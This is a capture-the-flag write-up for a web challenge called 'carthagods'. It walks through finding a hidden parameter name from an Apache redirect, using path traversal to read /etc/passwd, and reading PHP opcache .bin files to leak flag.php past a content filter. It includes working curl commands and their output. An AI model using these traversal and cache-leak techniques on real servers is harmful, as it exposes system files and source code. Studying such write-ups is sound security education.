# carthagods - 496pts - 10 solves 
Author: rekter0, Dali

> Salute the carthagods!
> 
> Hints
> 1. [redacted source](./src)

---

## Exploit

The challenge provided the redacted sourcecode as hints. 

.htaccess
```
...
RewriteRule ^([a-zA-Z0-9_-]+)$ index.php?*REDACTED*=$1 [QSA]
```

index.php
```php
...
<?php
  if(@$_GET[*REDACTED*]){
    $file=$_GET[*REDACTED*];
    $f=file_get_contents('thecarthagods/'.$file);
    if (!preg_match("/<\?php/i", $f)){
        echo $f;
    }else{
      echo 'php content detected';
    }
  }
?>
...
```

The php script accepts user provided `$file` path without any sanitation, however the GET parameter is redacted.

The `.htaccess` file rewrite the path to index.php with the GET parameter. Lets try the folder `thecarthagods` as shown in the php file.

```bash
curl http://carthagods.3k.ctf.to:8039/thecarthagods
```

We got the token
```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://carthagods.3k.ctf.to:8039/thecarthagods/?eba1b61134bf5818771b8c3203a16dc9=thecarthagods">here</a>.</p>
<hr>
<address>Apache/2.4.29 (Ubuntu) Server at carthagods.3k.ctf.to Port 8039</address>
</body></html>
```

With the token we can do path traversal
```bash
curl "http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../../etc/passwd"
```
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
```

However we cannot print the content of `flag.php` directly
```bash
curl "http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../flag.php"
```
```
<textarea class="label-input100" style="color:black;width: 100%;height: 300px;">php content detected             </textarea>
```

From the phpinfo provided we can know opcache is enabled, with `opcache.file_cache` set to `/var/www/cache/`. Maybe we can get the compiled version of `flag.php` and get its content.

The opcache will store the cache in the format `/var/www/cache/<system_id>/path/to/file.php.bin`, with system ID generated from PHP version, Zend version etc. Therefore, I spin up a Ubuntu VM and install the same version of php, enable opcache to get the same system ID.

The system ID is: `e2c6579e4df1d9e77e36d2f4ff8c92b3`

```bash
curl "http://carthagods.3k.ctf.to:8039/index.php?eba1b61134bf5818771b8c3203a16dc9=../../../../var/www/cache/e2c6579e4df1d9e77e36d2f4ff8c92b3/var/www/html/flag.php.bin" --output -
```
```html
...
<textarea class="label-input100" style="color:black;width: 100%;height: 300px;">OPCACHEe2c6579e4df1d9e77e36d2f4ff8c92b3�x��_Jqҍ@������������������������_���Ӛ��_/var/www/html/flag.php������/var/www/html/flag.php1����q��������d!=
VPyi0���Y�Į��{�opcache_get_statush���JK��&3k{Hail_the3000_years_7hat_are_b3h1nd}`Lq�(��<iframe width="560" height="315" src="https://www.youtube.com/embed/y8zZXMLBin4" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>֖|�flag                                          </textarea>
...
```